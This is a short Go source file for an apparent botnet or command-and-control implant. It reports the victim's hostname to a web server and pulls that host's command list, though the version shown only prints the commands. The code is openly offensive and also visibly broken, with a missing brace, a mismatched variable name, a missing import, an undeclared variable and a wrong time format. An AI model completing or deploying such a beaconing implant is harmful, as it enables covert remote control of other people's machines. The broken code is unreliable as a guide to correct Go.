// Golang bot to pull commands from webserver and execute them
//@author: degenerat3

package main

import "os/exec"
import "fmt"
import "log"
import "net/http"
import "bytes"
import "encoding/json"
import "strings"
import "time"
import "os"

var serv = "127.0.0.1:5000"	//IP of flask serv
var loop_time = 10		//sleep time in secs

// get hostname and return it as a string
func get_hn() string {
	cmd := exec.Command("hostname")
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
		return "Err"
	}
	o1 := string(out)
	o2 := strings.TrimSuffix(o1, "\n")
	return o2
}


func callback() {
	hn := get_hn()
	tm := time.Now()
	clean_time := tm.Format("01-01-2000 01:00:00")
	url := "http://" + serv + "/api/callback"	//turn ip into url
	jsonData := map[string]string{"hostname": hn, "time": clean_time}
	jsonVal, _ := json.Marshal(jsonData)
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil{
		fmt.Printf("Req Failed")
		return
	}
	return


func get_commands() {
	hn := get_hn()
	url = "http://" + serv + "/api/commands/" + hn
	r, err := http.Get(url)
	if err != nil{
		panic(err)
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil{
		panic(err)
	}
	fmt.Printf("%s\n", txt)
}

func run(){
	callback()
	get_commands()
}


